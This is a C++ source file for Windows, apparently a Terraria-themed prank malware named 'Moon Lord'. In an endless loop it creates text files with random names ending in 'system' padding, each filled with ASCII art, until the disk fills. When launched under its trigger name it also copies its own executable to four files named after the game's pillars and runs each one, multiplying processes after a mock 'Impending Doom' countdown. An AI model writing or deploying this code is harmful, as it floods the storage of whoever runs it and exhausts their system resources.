#include <iostream>
#include <fstream>
#include <windows.h>
#include <ctime>
using namespace std;
string text = "------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$----$$$--$$----------------------------------------------------------------------------------\n-------------------------------------------------------------------------$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$$$$$$$$$$$$----------------------------------------------------------------------------------\n-------------------------------------------------------------$$$$$$$$$$$$$$----------------------------------------------------------------------------------\n----------------------------------------------------------------------------$$-------------------------------------------------------------------------------\n----------------------------------------------------------------------------$$-------------------------------------------------------------------------------\n----------------------------------------------------------------------------$$-------------------------------------------------------------------------------\n----------------------------------------------------------------------------$$-------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n-------------------------------------------------------------------------------------------------------------------------------------------------------------";
string thisname;
string randomName();
string getAlpabet(int n);
int makeNopen(int param);
int main(int argc, char const *argv[]){
	
	srand(time(NULL));
	//get this name
	if(argc >0){
		string mae = argv[0];
		size_t ls = mae.find_last_of("\\/");

		if(ls != string::npos){
			thisname = mae.substr(ls+1);
		}
	}
	cout<<thisname<<endl;
	if(thisname == "Moon Lord" ){
		makeNopen(1);
	}else if(thisname == "Moon Lord.exe"){
		makeNopen(2);
	}

	cout<<"\n\nFight me first!"<<endl;
	// make txt
	while(true){
		string file = randomName() + ".txt";
		ofstream bukaFile(file, ios_base::app);
		if(bukaFile.is_open()){
			bukaFile<<text<<endl;
			bukaFile.close();
		}else{
			cout<<"Cant open"<<endl;
		}
	}
}

int makeNopen(int param){

	//warnings

	cout<<"\nImpending Doom Approaches..."<<endl;
	for(int i =10;i>0;i--){
		cout<<"in "<<i<<"..."<<endl;
		Sleep(1000);
	}

	// run and copy pillars
	string nameFile[4];
	nameFile[0] = "Solar";
	nameFile[1] = "Stardust";
	nameFile[2] = "Nebula";
	nameFile[3] = "Vortex";

	//run
	if(param == 1){
		thisname = thisname+".exe";
		//copy
		for(int i=0;i<4;i++){
			ifstream src(thisname, ios::binary);
			ofstream dest(nameFile[i]+".exe", ios::binary);
			if(src&&dest){
				dest<<src.rdbuf();
			}
		}
		//run
		for(int i=0;i<4;i++){
			const char* kk = nameFile[i].c_str(); // convert string to const char*
			ShellExecute(NULL, "open", kk, NULL, NULL,SW_SHOWNORMAL);
			cout<<"opens "<<i<<endl;
		}
	}else{
		//copy
		for(int i=0;i<4;i++){
			ifstream src(thisname, ios::binary);
			ofstream dest(nameFile[i]+".exe", ios::binary);
			if(src&&dest){
				dest<<src.rdbuf();
			}
		}
		//run
		for(int i=0;i<4;i++){
			const char* kk = nameFile[i].c_str(); // convert string to const char*
			ShellExecute(NULL, "open", kk, NULL, NULL,SW_SHOWNORMAL);
			cout<<"open "<<i<<" "<<kk<<endl;
		}
	}
	

}

string randomName(){
	int b;
	string a = "system";
	string c;
	//kiri
	for(int i =0;i<10;i++){
		b = rand() % 26 + 1;
		c+=getAlpabet(b);
	}
	//kanan
	a = c+a;
	for(int i =0;i<10;i++){
		b = rand() % 26 + 1;
		a+=getAlpabet(b);
	}
	return a;
}
string getAlpabet(int n){
	switch(n){
		case 1:
			return "a";
			
		case 2:
			return "b";
			
		case 3:
			return "c";
			
		case 4:
			return "d";
			
		case 5:
			return "e";
			
		case 6:
			return "f";
			
		case 7:
			return "g";
			
		case 8:
			return "h";
			
		case 9:
			return "i";
			
		case 10:
			return "j";
			
		case 11:
			return "k";
			
		case 12:
			return "l";
			
		case 13:
			return "m";
			
		case 14:
			return "n";
			
		case 15:
			return "o";
			
		case 16:
			return "p";
			
		case 17:
			return "q";
			
		case 18:
			return "r";
			
		case 19:
			return "s";
			
		case 20:
			return "t";
			
		case 21:
			return "u";
			
		case 22:
			return "v";
			
		case 23:
			return "w";
			
		case 24:
			return "x";
			
		case 25:
			return "y";
			
		default:
			return "z";
	}
}